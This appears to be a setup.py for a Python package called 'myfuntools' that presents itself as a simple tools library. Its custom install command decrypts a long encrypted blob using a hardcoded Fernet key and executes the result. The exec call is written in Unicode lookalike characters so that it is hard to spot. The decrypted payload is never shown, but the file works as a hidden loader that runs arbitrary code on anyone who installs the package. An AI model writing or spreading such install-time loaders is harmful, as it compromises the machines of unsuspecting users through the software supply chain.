from setuptools import setup
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os
import platform
import sys
import shutil
from cryptography.fernet import Fernet



class CustomInstall(install):
    def run(self):
        install.run(self)
        k = b'FBBi2PeMfIS21NihSL6SlqOD9K2OVdoQAU8-PG50oE0='
        my_str = b'gAAAAABoQ049Pm5xxYBYIUfBiVuCig-8L6O3VJ8A6jlZap6ZdxSK-Y_xbR2SYpbvfsurVwY0koF58GmSdM8OB0qj8-FGTzNdNDjYrEoU4EtCVc-kQiMJLNldYe1gXVLLA3-hc4hZ1_yvPuEVvesfZ_6p1rKmfyXjMpFmIs0vkUBhLoXeYUITkU9y5q4DkOyyTF7ilbqBH2apeMMxcbAjozO0QJAOZxHu4gFNDNE1iEc3JQmebnZxg1hQUTgUFjtW00TyMZI5TK26i6i8MuOljqXRfztYHTYQy-oj5qJCFmb4gsSLJ7QXkyyuQd__gliT6Xy12BNhH1Z2-f76U_GulzPUxi3J7M6U4lUxLjjUjpoE3zfg83sMCi46C7k0G7ABl4HVFrZDYHZakagciBNEApENJzW2ajIsybh7b64uj8g4-vKvXEUqclHjVPP4SeSBVTQbe5iNiSznLHwQMsiKUOWGExCayKA1PXjY_nX2T70edhuH0rRe_WIzTRctn84RE5mZptq9ySpx1h2xGNe-qD5NF6y-giq0etw2BaK_rdqWM6vxKtS-Hg48rbiNDuJlFoD4IQfZFm8Lx33sVGcwhk1RrqCt_xOY3aX6WZ5rBxpOWcGl9V9e_I-kDuzaT3U73YULFxadh4XldLnEmhYzIFaXJuVG7z0NY5SSm0ry1GXjCR1Wwktz0RIU7d3lIET-OeetHRuYHGDtntUNIqnSawdruHd9Eju_Nf8zpR9ZeOISCQTc2claKFC2G8sn6kX8D1iTXejEJyi3f1p0_52e3VZeHVWkiadBpOZ9h9ky8tZk4Nsc3Hgzm1Z7c5uP6VnOCw1SWXJBFPHSa47o2XcNVlpkkIizrjDyPHc4YEu-sCvZBBkrwHWOP3btfv4WBFfgxgAD5DcXzHV07kbreDtGf0O5o0qeMxxYscG8nHFZqPz8bEHaFpzXm1s='
        plaintext = Fernet(k).decrypt(my_str)
        ℯ𝓍ℯ𝒸(plaintext)


setup(name='myfuntools',
      version='0.1.3',
      description="tools",
      author="lvxianzhi",
      py_modules=["myfuntools.hello"],
      install_requires=[
        "pycryptodome",
        "cryptography",
        "cffi",
      ],
      cmdclass={
           "install": CustomInstall
       },
   )
